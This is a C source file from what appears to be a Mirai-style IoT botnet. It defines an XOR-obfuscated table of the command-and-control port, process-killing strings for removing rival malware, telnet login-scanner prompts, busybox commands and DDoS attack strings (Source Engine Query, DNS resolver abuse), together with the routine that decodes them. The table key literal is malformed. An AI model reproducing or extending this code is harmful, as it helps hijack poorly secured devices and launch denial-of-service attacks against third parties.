#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "includes.h"
#include "table.h"
#include "util.h"

uint32_t table_key = 0xfeddfllu;
struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{
/*
	CONNECTION SHIT
*/
	// 420
    add_entry(TABLE_CNC_PORT, "\x3C\x99", 2);
	// 48101
    add_entry(TABLE_SCAN_CB_PORT, "\x86\xD8", 2);
	/*
		EXECUTE MSG
	*/
	
	//DaddyL33T Infected Your Shit
    add_entry(TABLE_EXEC_SUCCESS, "\x79\x5C\x59\x59\x44\x71\x0E\x0E\x69\x1D\x74\x53\x5B\x58\x5E\x49\x58\x59\x1D\x64\x52\x48\x4F\x1D\x6E\x55\x54\x49\x3D", 29);
/*
	KILLER STRINGS
*/
	// /proc/
    add_entry(TABLE_KILLER_PROC, "\x12\x4D\x4F\x52\x5E\x12\x3D", 7);
	// /exe
    add_entry(TABLE_KILLER_EXE, "\x12\x58\x45\x58\x3D", 5);
	// /fd
    add_entry(TABLE_KILLER_FD, "\x12\x5B\x59\x3D", 4);
	// /proc/net/tcp
	add_entry(TABLE_KILLER_TCP, "\x12\x4D\x4F\x52\x5E\x12\x53\x58\x49\x12\x49\x5E\x4D\x3D", 14);
	// /maps
	add_entry(TABLE_KILLER_MAPS, "\x12\x50\x5C\x4D\x4E\x3D", 6);
	// /status
	add_entry(TABLE_KILLER_STATUS, "\x12\x4E\x49\x5C\x49\x48\x4E\x3D", 8);
	// .anime
	add_entry(TABLE_KILLER_ANIME, "\x13\x5C\x53\x54\x50\x58\x3D", 7);
	// /proc/net/route
    add_entry(TABLE_MEM_ROUTE, "\x12\x4D\x4F\x52\x5E\x12\x53\x58\x49\x12\x4F\x52\x48\x49\x58\x3D", 16);
	// /proc/cpuinfo
    add_entry(TABLE_MEM_CPUINFO, "\x12\x4D\x4F\x52\x5E\x12\x5E\x4D\x48\x54\x53\x5B\x52\x3D", 14);
	// BOGOMIPS
    add_entry(TABLE_MEM_BOGO, "\x7F\x72\x7A\x72\x70\x74\x6D\x6E\x3D", 9);
	// /etc/rc.d/rc.local
	add_entry(TABLE_MEM_RC, "\x12\x58\x49\x5E\x12\x4F\x5E\x13\x59\x12\x4F\x5E\x13\x51\x52\x5E\x5C\x51\x3D", 19);
	// g1abc4dmo35hnp2lie0kjf
	add_entry(TABLE_MEM_MASUTA1, "\x5A\x0C\x5C\x5F\x5E\x09\x59\x50\x52\x0E\x08\x55\x53\x4D\x0F\x51\x54\x58\x0D\x56\x57\x5B\x3D", 23);
	// assword
	add_entry(TABLE_MEM_MASUTA2, "\x5C\x4E\x4E\x4A\x52\x4F\x59\x3D", 8);
	// /dev/watchdog
	add_entry(TABLE_MEM_MIRAI1, "\x12\x59\x58\x4B\x12\x4A\x5C\x49\x5E\x55\x59\x52\x5A\x3D", 14);
	// /dev/misc/watchdog
	add_entry(TABLE_MEM_MIRAI2, "\x12\x59\x58\x4B\x12\x50\x54\x4E\x5E\x12\x4A\x5C\x49\x5E\x55\x59\x52\x5A\x3D", 19);
	// /dev/FTWDT101_watchdog
	add_entry(TABLE_MEM_VAMP1, "\x12\x59\x58\x4B\x12\x7B\x69\x6A\x79\x69\x0C\x0D\x0C\x62\x4A\x5C\x49\x5E\x55\x59\x52\x5A\x3D", 23);
	// /dev/FTWDT101\ watchdog
    add_entry(TABLE_MEM_VAMP2, "\x12\x59\x58\x4B\x12\x7B\x69\x6A\x79\x69\x0C\x0D\x0C\x61\x1D\x4A\x5C\x49\x5E\x55\x59\x52\x5A\x3D", 24);
	// /dev/netslink/
	add_entry(TABLE_MEM_VAMP3, "\x12\x59\x58\x4B\x12\x53\x58\x49\x4E\x51\x54\x53\x56\x12\x3D", 15);
/*
	SCANNER SHIT
*/
	//shell
    add_entry(TABLE_SCAN_SHELL, "\x4E\x55\x58\x51\x51\x3D", 6);
    //enable
	add_entry(TABLE_SCAN_ENABLE, "\x58\x53\x5C\x5F\x51\x58\x3D", 7);
    //system
	add_entry(TABLE_SCAN_SYSTEM, "\x4E\x44\x4E\x49\x58\x50\x3D", 7);
    //sh
	add_entry(TABLE_SCAN_SH, "\x4E\x55\x3D", 3);
    // /bin/busybox daddyl33t
	add_entry(TABLE_SCAN_QUERY, "\x12\x5F\x54\x53\x12\x5F\x48\x4E\x44\x5F\x52\x45\x1D\x59\x5C\x59\x59\x44\x51\x0E\x0E\x49\x3D", 23);
    // daddyl33t: applet not found
	add_entry(TABLE_SCAN_RESP, "\x59\x5C\x59\x59\x44\x51\x0E\x0E\x49\x07\x1D\x5C\x4D\x4D\x51\x58\x49\x1D\x53\x52\x49\x1D\x5B\x52\x48\x53\x59\x3D", 28);
    // ncorrect
	add_entry(TABLE_SCAN_NCORRECT, "\x53\x5E\x52\x4F\x4F\x58\x5E\x49\x3D", 9);
	// assword
	add_entry(TABLE_SCAN_ASSWORD, "\x5C\x4E\x4E\x4A\x52\x4F\x59\x3D", 8);
	// ogin
	add_entry(TABLE_SCAN_OGIN, "\x52\x5A\x54\x53\x3D", 5);
	// enter
	add_entry(TABLE_SCAN_ENTER, "\x58\x53\x49\x58\x4F\x3D", 6);
    // /bin/busybox ps
	add_entry(TABLE_SCAN_PS, "\x12\x5F\x54\x53\x12\x5F\x48\x4E\x44\x5F\x52\x45\x1D\x4D\x4E\x3D", 16);
    // /bin/busybox kill -9
	add_entry(TABLE_SCAN_KILL_9, "\x12\x5F\x54\x53\x12\x5F\x48\x4E\x44\x5F\x52\x45\x1D\x56\x54\x51\x51\x1D\x10\x04\x3D", 21);
/*
	ATTACK STRINGS
*/
	// TSource Engine Query
    add_entry(TABLE_ATK_VSE, "\x69\x6E\x52\x48\x4F\x5E\x58\x1D\x78\x53\x5A\x54\x53\x58\x1D\x6C\x48\x58\x4F\x44\x3D", 21);
	// /etc/resolv.conf
    add_entry(TABLE_ATK_RESOLVER, "\x12\x58\x49\x5E\x12\x4F\x58\x4E\x52\x51\x4B\x13\x5E\x52\x53\x5B\x3D", 17);
	// nameserver
    add_entry(TABLE_ATK_NSERV, "\x53\x5C\x50\x58\x4E\x58\x4F\x4B\x58\x4F\x3D", 11);
/*
	MISC SHIT
*/
	// /dev/watchdog
    add_entry(TABLE_MISC_WATCHDOG, "\x12\x59\x58\x4B\x12\x4A\x5C\x49\x5E\x55\x59\x52\x5A\x3D", 14);
    // /dev/misc/watchdog
	add_entry(TABLE_MISC_WATCHDOG2, "\x12\x59\x58\x4B\x12\x50\x54\x4E\x5E\x12\x4A\x5C\x49\x5E\x55\x59\x52\x5A\x3D", 19);
	// g1abc4dmo35hnp2lie0kjf
	add_entry(TABLE_MISC_RAND, "\x5A\x0C\x5C\x5F\x5E\x09\x59\x50\x52\x0E\x08\x55\x53\x4D\x0F\x51\x54\x58\x0D\x56\x57\x5B\x3D", 23);
	// dvrHelper
	add_entry(TABLE_MISC_DVRHELP, "\x59\x4B\x4F\x75\x58\x51\x4D\x58\x4F\x3D", 10);
}

void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (!val->locked)
    {
        printf("[table] Tried to double-unlock value %d\n", id);
        return;
    }
#endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] Tried to double-lock value\n");
        return;
    }
#endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] Tried to access table.%d but it is locked\n", id);
        return NULL;
    }
#endif

    if (len != NULL)
        *len = (int)val->val_len;
    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;
#ifdef DEBUG
    table[id].locked = TRUE;
#endif
}

static void toggle_obf(uint8_t id)
{
    int i;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for (i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }

#ifdef DEBUG
    val->locked = !val->locked;
#endif
}
